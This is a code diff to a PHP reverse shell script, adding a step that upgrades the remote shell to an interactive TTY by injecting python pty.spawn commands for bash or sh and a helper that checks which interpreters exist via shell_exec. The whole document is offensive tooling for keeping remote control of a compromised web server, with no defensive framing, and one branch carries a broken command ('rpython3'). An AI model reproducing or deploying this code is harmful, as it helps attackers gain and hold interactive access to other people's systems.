@@ -57,6 +57,34 @@
     stream_set_blocking($pipes[2], FALSE);
 
 
+    //attempt to stablize shell
+    fwrite($socket, "ATTEMPTING TO STABALIZE SHELL\n");
+
+    if ( cmdExists("python") && cmdExists("bash") )
+    {
+        fwrite($pipes[0], "python -c 'import pty; pty.spawn(\"/bin/bash\")'");
+        fwrite($socket, "SHELL STABALIZED :: HIT 'ENTER'");
+    }
+    elseif ( cmdExists("python3") && cmdExists("bash") )
+    {
+        fwrite($pipes[0], "rpython3 -c 'import pty; pty.spawn(\"/bin/bash\")'");
+        fwrite($socket, "SHELL STABALIZED :: HIT 'ENTER'");
+    }
+    elseif ( cmdExists("python") )
+    {
+        fwrite($pipes[0], "python -c 'import pty; pty.spawn(\"/bin/sh\")'");
+        fwrite($socket, "SHELL STABALIZED :: HIT 'ENTER'");
+    }
+    elseif ( cmdExists("python3") )
+    {
+        fwrite($pipes[0], "python3 -c 'import pty; pty.spawn(\"/bin/sh\")'");
+        fwrite($socket, "SHELL STABALIZED :: HIT 'ENTER'");
+    }
+    else 
+    {
+        fwrite($socket, "UNABLE TO STABALIZE SHELL, TTY FUNCTIONALITY IS NOT AVAILABLE\n");
+    }
+
     // now we've got a reverse shell.
     // handle io:
     while (TRUE) 
@@ -111,5 +139,11 @@
     // clean up nice
     fclose($socket);
     proc_close($process);
+
+
+    function cmdExists ($cmd)
+    {
+        return !empty(shell_exec("which $cmd"));
+    }
 
 ?>
